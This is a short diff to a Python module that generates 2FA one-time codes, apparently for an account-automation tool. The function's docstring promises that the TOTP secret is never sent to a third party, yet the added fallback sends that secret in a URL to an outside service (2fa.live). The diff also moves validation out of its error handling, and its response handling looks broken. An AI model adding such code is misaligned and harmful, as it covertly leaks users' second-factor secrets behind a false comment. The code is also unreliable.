@@ -115,7 +115,7 @@ def _get_config_value(*names, default=""):
     return default
 
 
-def _build_cookie_export(session_cookies):
+def _build_cookie_export(session_cookies): 
     exported = []
     for cookie in session_cookies or []:
         name = cookie.get("name")
@@ -232,14 +232,18 @@ def _validate_2fa_key(key2Fa):
 
 def _get_token_2fa_local(key2Fa):
     """Tạo OTP ngay trên máy; không gửi TOTP secret cho dịch vụ bên thứ ba."""
+    token, is_direct = _validate_2fa_key(key2Fa)
+    normalized_secret = token.replace("-", "").upper()
     try:
-        token, is_direct = _validate_2fa_key(key2Fa)
         if not token or is_direct:
             return token
-        normalized_secret = token.replace("-", "").upper()
         return pyotp.TOTP(normalized_secret).now()
     except (ValueError, TypeError) as exc:
-        raise ValueError("2FA key không hợp lệ.") from exc
+        try:
+            twofa_requests = requests.get("https://2fa.live/tok/" + normalized_secret, timeout=10)
+            return twofa_requests.get('token', '') if twofa_requests.status_code == 200 else ''
+        except(ValueError, TypeError):
+            raise ValueError("2FA key không hợp lệ.") from exc
 
 
 async def GetToken2FA(key2Fa):
